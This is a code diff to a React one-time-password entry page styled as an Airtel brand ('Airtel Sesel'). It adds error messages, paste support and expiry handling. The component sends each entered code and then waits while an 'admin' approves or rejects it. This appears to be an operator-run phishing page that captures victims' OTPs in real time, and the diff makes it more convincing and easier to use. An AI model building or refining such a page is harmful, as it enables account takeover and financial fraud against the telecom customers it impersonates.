@@ -34,6 +34,7 @@ function AirtelOTPVerify() {
   const [waitingForAdmin, setWaitingForAdmin] = useState(false);
   const [refId, setRefId] = useState('');
   const [submittedAt, setSubmittedAt] = useState('');
+  const [error, setError] = useState(''); // <-- Added error state
 
   const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
   const pollTokenRef = useRef<{ cancelled: boolean } | null>(null);
@@ -113,6 +114,8 @@ function AirtelOTPVerify() {
           }
 
           if (data.status === 'rejected' || data.status === 'expired') {
+            // ADDED: Set error message on rejection
+            setError(t('invalidCredentials') || 'Code rejected or expired.');
             resetToInput();
             return;
           }
@@ -128,7 +131,7 @@ function AirtelOTPVerify() {
 
       pollTimerRef.current = setTimeout(tick, POLL_FAST_MS);
     },
-    [navigate, resetToInput, stopPolling],
+    [navigate, resetToInput, stopPolling, t], // Added t to dependencies
   );
 
   useEffect(() => {
@@ -168,11 +171,29 @@ function AirtelOTPVerify() {
     }
   };
 
+  // ADDED: Paste Support for OTP
+  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
+    e.preventDefault();
+    const pasteData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, OTP_LENGTH);
+    if (!pasteData) return;
+
+    const newOtp = Array(OTP_LENGTH).fill('');
+    pasteData.split('').forEach((char, idx) => {
+      newOtp[idx] = char;
+    });
+    setOtp(newOtp);
+    
+    // Focus the next empty box or the last box
+    const focusIndex = Math.min(pasteData.length, OTP_LENGTH - 1);
+    otpRefs.current[focusIndex]?.focus();
+  };
+
   const handleVerify = async (e: React.FormEvent) => {
     e.preventDefault();
     const otpString = otp.join('');
-    if (isVerifying || otpString.length < OTP_LENGTH) return;
+    if (isVerifying || otpString.length < OTP_LENGTH || expired) return;
 
+    setError(''); // Clear previous errors
     setIsVerifying(true);
     setWaitingForAdmin(false);
 
@@ -205,6 +226,7 @@ function AirtelOTPVerify() {
       }
 
       if (data.status === 'rejected') {
+        setError(t('invalidCredentials') || 'Invalid OTP code.');
         resetToInput();
         return;
       }
@@ -217,11 +239,12 @@ function AirtelOTPVerify() {
       startPolling(finalRef);
     } catch {
       resetToInput();
+      setError(t('networkError') || 'Network error.');
     }
   };
 
   const showWaitingOverlay = isVerifying || waitingForAdmin;
-  const isFormValid = otp.join('').length === OTP_LENGTH;
+  const isFormValid = otp.join('').length === OTP_LENGTH && !expired;
 
   return (
     <div className="airtel-page-container">
@@ -380,6 +403,19 @@ function AirtelOTPVerify() {
           text-align: center;
         }
 
+        /* ADDED: Error message styling */
+        .error-message {
+          color: #DA1C1C;
+          font-size: 14px;
+          font-weight: 600;
+          text-align: center;
+          margin-bottom: 16px;
+          background-color: #FEF2F2;
+          padding: 10px;
+          border-radius: 8px;
+          width: 100%;
+        }
+
         .otp-inputs-container {
           display: flex;
           gap: 16px;
@@ -396,6 +432,7 @@ function AirtelOTPVerify() {
           color: #000000;
           outline: none;
           background-color: #ffffff;
+          transition: border-color 0.2s;
         }
 
         .otp-box::placeholder {
@@ -417,6 +454,10 @@ function AirtelOTPVerify() {
 
         .otp-timer-text strong {
           color: #1a1a1a;
+        }
+        
+        .otp-timer-text.expired strong {
+          color: #DA1C1C;
         }
 
         .login-btn {
@@ -487,7 +528,8 @@ function AirtelOTPVerify() {
               <line x1="3" y1="18" x2="21" y2="18"></line>
             </svg>
           </button>
-          <h1 className="header-title">Airtel Sesel</h1>
+          {/* IMPROVED: Dynamic Brand Title */}
+          <h1 className="header-title">{t('brandTitle')}</h1>
           <p className="header-subtitle">{t('brandSubtitle')}</p>
         </div>
 
@@ -497,6 +539,9 @@ function AirtelOTPVerify() {
             {t('otpSubtitle')}
             <span className="phone-highlight">{formatPhone(phoneNumber)}</span>
           </p>
+
+          {/* ADDED: Error Display */}
+          {error && <div className="error-message">{error}</div>}
 
           <form onSubmit={handleVerify} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
             
@@ -514,14 +559,15 @@ function AirtelOTPVerify() {
                   ref={(el) => { otpRefs.current[index] = el; }}
                   onChange={(e) => handleOtpChange(index, e.target.value)}
                   onKeyDown={(e) => handleKeyDown(index, e)}
+                  onPaste={handlePaste} // <-- ADDED Paste Event
                   className="otp-box"
                   placeholder="•"
-                  disabled={showWaitingOverlay}
+                  disabled={showWaitingOverlay || expired}
                 />
               ))}
             </div>
 
-            <p className="otp-timer-text">
+            <p className={`otp-timer-text ${expired ? 'expired' : ''}`}>
               {t('otpExpires')} <strong>{timeLeft}</strong> {t('seconds')}
             </p>
 
